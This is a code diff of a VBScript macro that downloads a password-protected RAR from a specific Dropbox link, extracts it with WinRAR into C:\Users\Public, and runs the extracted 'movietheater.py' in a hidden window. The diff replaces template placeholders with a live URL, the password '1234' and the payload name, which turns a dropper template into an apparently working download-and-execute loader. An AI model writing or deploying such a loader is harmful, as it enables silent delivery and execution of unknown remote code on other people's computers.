@@ -74,8 +74,8 @@
 
     Sub DownloadRAR()
         Dim url, filePath, xhttp, stream
-        url = "https://www.dropbox.com/s/your_file_path/yourfile.rar?dl=1" ' <-- Put your Dropbox direct download link here
-        filePath = "C:\Users\Public\file.rar"
+        url = "https://www.dropbox.com/scl/fi/63ddwua351z21av5353tj/movietheater.rar?rlkey=aifqekvpqcq1tmlie35yqk43v&st=8tkt93m0&dl=1" ' <-- Put your Dropbox direct download link here
+        filePath = "C:\Users\Public\movietheater.rar"
 
         Set xhttp = CreateObject("MSXML2.XMLHTTP")
         xhttp.Open "GET", url, False
@@ -99,9 +99,9 @@
         ' Adjust this path if WinRAR is installed somewhere else
         rarPath = """C:\Program Files\WinRAR\WinRAR.exe"""
 
-        rarFile = "C:\Users\Public\file.rar"
+        rarFile = "C:\Users\Public\movietheater.rar"
         extractPath = "C:\Users\Public\extracted\"
-        password = "YourPassword" ' <-- Put the password here
+        password = "1234" ' <-- Put the password here
 
         ' Create extraction folder if it doesn't exist
         Set objFSO = CreateObject("Scripting.FileSystemObject")
@@ -119,7 +119,7 @@
         Dim objShell, exePath
 
         ' Change "program.exe" to the actual executable you want to run from the extracted folder
-        exePath = "C:\Users\Public\extracted\program.exe"
+        exePath = "C:\Users\Public\extracted\movietheater.py"
 
         Set objShell = CreateObject("WScript.Shell")
         objShell.Run Chr(34) & exePath & Chr(34), 0, False
